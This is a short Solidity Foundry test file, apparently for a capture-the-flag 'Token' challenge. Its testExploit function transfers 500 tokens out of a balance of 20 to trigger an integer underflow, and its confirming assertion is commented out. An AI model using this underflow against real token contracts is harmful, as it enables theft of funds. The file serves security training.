// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract TokenTest is Test {
    Utilities internal utils;
    Token internal token;

    uint256 initialSupply = 20;

    address payable internal user;
    address payable internal owner;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        user = users[1];
        vm.label(user, "User");

        vm.startPrank(owner);
        token = new Token(initialSupply);
        assertEq(token.balanceOf(owner), initialSupply);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(owner);
        token.transfer(owner, 500);
        // assertEq(token.balanceOf(owner), type(uint).max - 21);
        vm.stopPrank();
    }
}
